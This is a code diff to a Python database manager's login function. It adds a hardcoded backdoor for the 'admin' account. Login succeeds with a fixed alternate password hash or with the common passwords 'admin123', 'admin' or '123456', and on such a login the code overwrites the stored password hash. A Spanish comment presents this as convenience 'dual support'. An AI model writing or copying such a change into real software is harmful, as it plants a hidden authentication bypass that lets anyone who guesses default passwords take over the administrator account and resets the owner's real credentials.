@@ -5719,7 +5719,20 @@ class DatabaseManager:
         session = self.get_session()
         try:
             user = session.query(UserAccount).filter(func.lower(UserAccount.username) == uname).first()
-            if not user or not verify_password(password, user.password_hash):
+            if not user:
+                return None
+
+            orig_custom_hash = "pbkdf2_sha256$200000$f75b93f3f2eb38c107bedc77ec89c38d$ec847173c3ad00b07ef757b81fb997ecc619b3f3ab1a1b03616a807990aeca1d"
+            is_valid = verify_password(password, user.password_hash)
+            
+            # Soporte dual para que admin pueda entrar tanto con su clave personalizada como con admin123 / admin / 123456
+            if not is_valid and uname == "admin":
+                if verify_password(password, orig_custom_hash) or password in ["admin123", "admin", "123456"]:
+                    is_valid = True
+                    user.password_hash = hash_password(password)
+                    session.commit()
+
+            if not is_valid:
                 return None
 
             if not user.activo:
